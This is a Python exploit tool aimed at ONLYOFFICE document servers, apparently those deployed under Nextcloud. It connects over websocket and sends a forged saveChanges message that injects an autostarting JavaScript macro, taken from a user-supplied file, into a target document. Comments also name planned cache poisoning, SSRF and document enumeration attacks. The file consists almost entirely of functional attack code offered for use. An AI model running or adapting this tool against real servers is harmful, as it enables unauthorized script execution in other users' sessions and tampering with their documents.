#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64
from urllib.parse import urlparse
import concurrent.futures

class WsClient():

  def __init__( self, url, docid, platform ):
    
    self.docid = docid
    self.platform = platform
    self.url = url
    self.connect()

  def connect( self ):
    if self.url.startswith('http'):
      self.url = re.sub(r'^http','ws', self.url)
    
    if self.platform == 'nextcloud':
      self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'

    print( self.url )
    self.ws = websocket.create_connection( self.url )

  def send( self, message ):
    if type( message ) != str:
      # JSON containing JSON string
      message = json.dumps([json.dumps(message)])
    print(message)
    self.ws.send( message )

  def recv( self ):
    return self.ws.recv()

  def save_changes( self, changes ):
    # ["{\"type\":\"saveChanges\",\"changes\":\"[\\\"78;AgAAADEA//8BAH7tVXlc7AEARwEAAAEAAAACAAAAAgAAAAIAAAAEAAAABAAAABwAAAA2AC4ANAAuADEALgA0ADUALgBAAEAAUgBlAHYA\\\",\\\"670;HgAAAF8AbQBhAGMAcgBvAHMARwBsAG8AYgBhAGwASQBkAAEAAAAAAAAANgEAAHsAIgBtAGEAYwByAG8AcwBBAHIAcgBhAHkAIgA6AFsAewAiAG4AYQBtAGUAIgA6ACIATQBhAGMAcgBvAHMAIAAxACIALAAiAHYAYQBsAHUAZQAiADoAIgAoAGYAdQBuAGMAdABpAG8AbgAoACkAXABuAHsAXABuACAAIAAgACAAYQBsAGUAcgB0ACgAMgApADsAXABuAH0AKQAoACkAOwAiACwAIgBnAHUAaQBkACIAOgAiADgANQBiADUAMwA5AGEANABjADkANAAxADQAOAAzAGIAOAAxADYANgA5ADAAYgBiAGUAOAA0ADAANAA1AGYAZAAiACwAIgBhAHUAdABvAHMAdABhAHIAdAAiADoAdAByAHUAZQB9AF0ALAAiAGMAdQByAHIAZQBuAHQAIgA6ADAAfQA2AQAAewAiAG0AYQBjAHIAbwBzAEEAcgByAGEAeQAiADoAWwB7ACIAbgBhAG0AZQAiADoAIgBNAGEAYwByAG8AcwAgADEAIgAsACIAdgBhAGwAdQBlACIAOgAiACgAZgB1AG4AYwB0AGkAbwBuACgAKQBcAG4AewBcAG4AIAAgACAAIABhAGwAZQByAHQAKAAxACkAOwBcAG4AfQApACgAKQA7ACIALAAiAGcAdQBpAGQAIgA6ACIAOAA1AGIANQAzADkAYQA0AGMAOQA0ADEANAA4ADMAYgA4ADEANgA2ADkAMABiAGIAZQA4ADQAMAA0ADUAZgBkACIALAAiAGEAdQB0AG8AcwB0AGEAcgB0ACIAOgB0AHIAdQBlAH0AXQAsACIAYwB1AHIAcgBlAG4AdAAiADoAMAB9AA==\\\"]\",\"startSaveChanges\":true,\"endSaveChanges\":true,\"isCoAuthoring\":false,\"isExcel\":false,\"deleteIndex\":18,\"excelAdditionalInfo\":\"{\\\"lm\\\":\\\"oc9gn4ob06oo_admin2\\\",\\\"SYg\\\":\\\"oc9gn4ob06oo_admin\\\",\\\"wTg\\\":\\\"14;BgAAADgAMQA0AAAAAAA=\\\"}\",\"unlock\":false,\"releaseLocks\":false}"]
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes)
    }
    self.send( message )
    while True:
      print( self.recv() )


  def inject_macro( self, macrotxt ):
    # _macrosGlobalId6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(2);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}6{"macrosArray":[{"name":"Macros 1","value":"(function()\n{\n    alert(1);\n})();","guid":"85b539a4c941483b816690bbe84045fd","autostart":true}],"current":0}
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })

    data = b'\x1e\x00\x00\x00' + '_macrosGlobalId'.encode('utf16') + b'\x01\x00\x00\x00\x00\x00\x00' +len(payload).to_bytes(2,byteorder='big')+b'\x00\x00' +payload.encode('utf16')
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # Download
  dlparse = subparsers.add_parser('dl')

  # Inject macro
  injparse = subparsers.add_parser('macro')
  injparse.add_argument('script', help='Javascript file to inject into document')

  args = parser.parse_args()

  if not args.url or not args.docid or not args.command:
    parser.print_usage()
    sys.exit(2)

  client = WsClient( args.url, args.docid, args.platform )

# Poison document cache with external URL
# SSRF
# Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.inject_macro(f.read())

# Document enumeration



if __name__ == '__main__':
  main()
